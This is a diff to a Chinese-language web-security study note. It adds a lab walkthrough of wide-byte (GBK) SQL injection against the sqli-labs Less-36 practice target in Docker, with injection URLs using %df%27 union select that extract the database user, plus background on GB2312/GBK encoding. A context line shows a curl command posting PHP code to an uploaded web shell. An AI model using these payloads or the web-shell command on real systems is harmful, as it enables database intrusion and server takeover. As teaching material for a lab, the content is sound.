@@ -2405,15 +2405,129 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 
 
-### sqli-labs 
+### 宽字节注入 
+
+#### sqli-labs 容器安装
+
+- 下载及启动方式
+  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/sqli-labs
+  - docker images
+  - docker container list -a
+  - docker ps
+  - docker stop zealous_heyrovsky
+    - 关闭原本占用80端口的 bWAPP
+  - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/sqli-labs
+  - docker ps
+    - 看到已经启动成功
+- 关闭占据 80 端口的 bwapp，打开 sqli-labs，
+- 仅映射到 80 端口，若映射到其他端口，实验跳转过程不方便。 
+
+
+
+#### 逃逸绕过转义函数（宽字节注入） 
+
+- 安装 qli-labs  靶机
+
+- 打开浏览器，输入，127.0.0.1/
+
+- 初始化数据表，点击页面上的[Setup/reset Database for labs](http://127.0.0.1/sql-connections/setup-db.php) ，可以进行页面刷新操作
+
+- 输入新地址，http://127.0.0.1/Less-36/?id=133
+
+  - 进行 union 注入
+  - http://127.0.0.1/Less-36/?id=133 %df%27 union select 1,2,3 %23
+    - %27 ------ ‘
+    - %23 ------ #
+    - %df ------ 无意义
+    - %5c ------ \ 
+  - 页面展示：
+    - `Hint: The Query String you input is escaped as : 133 �\' union select 1,2,3 #`
+    - `The Query String you input in Hex becomes : 31333320df5c2720756e696f6e2073656c65637420312c322c332023`
+    - Your Login name:2
+    - Your Password:3
+  - 更换select 的内容，展示数据库的用户名，完成注入
+    - http://127.0.0.1/Less-36/?id=133 %df%27 union select 1,user(),3 %23
+    - Your Login name:root@localhost
+    - Your Password:3
+
+- 注入原理
+
+  - 数据库执行的命令
+
+  - ```php
+    mysql_query("SET NAMES gbk");
+    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+    $result = mysql_query($sql);  // 基于 gbk 编码方式，进行转义操作
+    ```
+
+  - 原本直接输入 id 就可以完成查询，现在构造了一个 %df%27 ，由于%27 表示的是'，在数据库操作的时候需要转义，在其前面加上一个反斜杠 \，而反斜杠的编码为 %5c，结合前面的%df，就组成了新的字符 %df5c，而这个字符对应在 gbk 表中的额一个字，如下图所示。
+
+  - ![1617356272568](HackerMeWeb.assets/1617356272568.png)
+
+  - 此时新的 SQL 语句就变了，变成 `$sql= "select * from users where id = '133運' union select 1,user,3 "; `
+
+  - 单引号刚好闭合前面的引号，完成SQL注入
+
+
+
+#### URL编码 
+
+- URL编码 ，从 %00 到 %8f
+- 见下表
+
+![1617356441969](HackerMeWeb.assets/1617356441969.png)
+
+
+
+#### SET NAMES X 
+
+- SET NAMES X 与下面这三句话效果等同
+
+  - ```sh
+    SET character_set_client = x;
+    SET character_set_results = x;
+    SET character_set_connection = x;
+    ```
+
+  - 同样这些参数也可以通过 my.ini/cnf 进行静态设置 
+
+
+
+#### GBK编码 
+
+- 常见的汉字字符集编码
+  - GB2312编码:1981年5月1日发布的简体中文汉字编码国家标准。GB2312对汉字采用**双字节编码**，收录7445个图形字符，其中包括6763个汉字。
+  - GBK编码∶1995年12月发布的汉字编码国家标准，是对GB2312编码的扩充，对汉字采用双字节编码。GBK字符集共收录21003个汉字，包含国家标准GB13000-1中的全部中日韩汉字，和BIG5编码中的所有汉字。
+  - Unicode编码︰国际标准字符集，它将世界各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台的文本信息转换。
+
+
+
+#### GB2312与GBK编码 
+
+- GB2312
+  - 当国人得到计算机后，那就要对汉字进行编码。在ASCII码表的基础上，小于127的字符意义与原来相同;而将两个大于127的字节连在一起，来表示汉字，前一个字节从OxA1(161)到OxF7(247)共87个字节，称为高字节，后一个字节从OxA1 (161)到 OxFE(254)共94个字节，称为低字节，两者可组合出约8000种组合，用来表示6763个简体汉字、数学符号、罗马字母、日文字等。
+  - 在重新编码的数字、标点、字母是两字节长的编码，这些称为"全角"字符;而原来在ASClI码表的127以下的称为"半角"字符。简单而言，GB2312就是在ASCII基础上的简体汉字扩展。
+  - website: http://www.fileformat.info/info/charset/GB2312/list.htm
+  - example:
+    - 你好
+    - xc4\xe3%xbaixc3
+- GBK
+  - 简单而言，GBK是对GB2312的进一步扩展(K是汉语拼音kuo zhan(扩展)中"扩"字的声母)，收录了21886个汉字和符号，完全兼容GB2312。
+
+
+
+#### 寻找注入点 
+
+- 基于 %df 和 转义符反斜杠 %5c
+- 碰撞出来了新的火花，此时就可以完成宽字节注入
+
+![1617356272568](HackerMeWeb.assets/1617356272568.png)
 
 
 
 
 
-
-
-
+### 二次注入 
 
 
 
